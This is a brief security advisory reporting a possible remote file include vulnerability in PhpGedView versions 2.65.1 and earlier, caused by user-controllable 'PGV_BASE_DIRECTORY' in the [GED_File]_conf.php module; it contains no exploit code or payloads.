It has been reported that PhpGedView may be prone to a remote file include vulnerability that may allow an attacker to include malicious files containing arbitrary code to be executed on a vulnerable system. The problem reportedly exists because remote users may influence the 'PGV_BASE_DIRECTORY' variable in the [GED_File]_conf.php module, which specifies an include path.

PhpGedView versions 2.65.1 and prior have been reported to be prone to this issue.
